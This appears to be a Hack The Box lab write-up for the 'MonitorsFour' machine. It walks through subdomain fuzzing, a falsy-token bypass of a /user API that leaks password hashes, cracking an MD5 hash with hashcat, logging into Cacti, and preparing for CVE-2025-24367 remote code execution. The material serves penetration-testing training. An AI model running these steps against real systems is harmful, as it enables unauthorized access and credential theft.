Hack The Box – MonitorsFour

Target: monitorsfour.htb
Status: Authenticated Access Achieved (Cacti)
Approach: Web Enumeration → Subdomain Discovery → API Logic Flaw → Credential Disclosure → Offline Hash Cracking → Authenticated Access

1. Initial Reconnaissance
Port & Service Discovery

Initial scanning revealed an HTTP service hosted behind nginx with name-based virtual hosting enabled.

Host Resolution

The primary hostname was added locally:

10.10.11.98  monitorsfour.htb

2. Web Enumeration (Main Site)

Directory enumeration was performed against the primary web application.

Command Used
ffuf -u http://monitorsfour.htb/FUZZ \
-w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt \
-t 40 -timeout 10 \
-mc 200,301,302,307,401,403 \
-fs 0

Discovered Endpoints

/login

/forgot-password

/static

/api

/user

The /user endpoint returned JSON responses instead of redirects, indicating API functionality.

3. Subdomain Enumeration

Host header fuzzing was used to identify additional virtual hosts.

Command Used
ffuf -u http://monitorsfour.htb/ \
-H "Host: FUZZ.monitorsfour.htb" \
-w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
-mc 200,301,302 \
-fs 138 -fw 3 -fl 8

Result
cacti.monitorsfour.htb


The subdomain was added locally:

10.10.11.98  monitorsfour.htb cacti.monitorsfour.htb

4. Cacti Enumeration

Browsing the subdomain revealed a Cacti monitoring instance.

Version Identification

The following file was accessible:

http://cacti.monitorsfour.htb/cacti/CHANGELOG


This confirmed the application version:

Cacti 1.2.28

5. Cacti Directory Enumeration

Targeted enumeration of the Cacti installation was performed.

ffuf -u http://cacti.monitorsfour.htb/cacti/FUZZ \
-w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt \
-mc 200,301,302,403 \
-fs 0

Notable Paths

/log/

/include/

/plugins/

/cli/

/docs/

/CHANGELOG

6. API Analysis – /user Endpoint

The /user endpoint on the main site required a token parameter.

Initial Request
curl -s http://monitorsfour.htb/user


Response:

{"error":"Invalid or missing token"}


This confirmed token-based access control.

7. Token Validation Logic Flaw

Testing different token values revealed improper validation.

Invalid Token
curl -s "http://monitorsfour.htb/user?token=test"


Returned:

{"error":"Invalid or missing token"}

Falsy Token Bypass
curl -s "http://monitorsfour.htb/user?token=0"

Result

The response returned full user objects, including:

Usernames

Emails

Roles

Internal tokens

Password hashes

This represented a Broken Object Level Authorization (BOLA / IDOR) vulnerability caused by a logic flaw where a falsy token bypassed validation.

8. Sensitive Data Exposure

Among the returned records was a privileged account:

Name: Marcus Higgins

Username: marcus

Role: Super User

Password Hash: MD5

This confirmed a viable authentication pivot.

9. Hash Extraction to File (Offline Attack)

The exposed password hash was extracted and saved to a file for offline cracking.

Command Used
curl -s "http://monitorsfour.htb/user?token=0" | jq -r '.[].password' > hashes.txt


The file hashes.txt contained the extracted MD5 hash.

10. Password Cracking with Hashcat

The hash was identified as MD5 based on length and format.

Hashcat Command
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt

Result
56b32e4a3ef15395f6c46c1c9e1cd36:wonderful1


The plaintext password wonderful1 was successfully recovered.

11. Authentication to Cacti

Using the credentials obtained from the API and hash cracking:

Username: marcus
Password: wonderful1


Successful authentication to the Cacti web interface was achieved at:

http://cacti.monitorsfour.htb/cacti/

12. CVE-2025-24367 Python PoC Context

A public Python proof-of-concept for CVE-2025-24367 was evaluated:

https://github.com/SoftAndoWetto/CVE-2025-24367-PoC-Cacti



https://github.com/r0tn3x/CVE-2025-24367/blob/main/

Observations

The CVE applies to Cacti 1.2.28

The exploit requires authenticated access

Initial attempts using the admin username failed

Analysis of the /user?token=0 output revealed the correct login user was marcus

This explained why the exploit initially failed and confirmed that authentication prerequisites were the missing requirement.

13. Current Status
Achieved

Subdomain discovery

Application version identification

API authorization bypass

Sensitive credential disclosure

Offline password cracking via Hashcat

Valid authenticated access to Cacti

Ready For

Authenticated RCE via CVE-2025-24367

Manual or scripted command execution

Shell acquisition

Privilege escalation
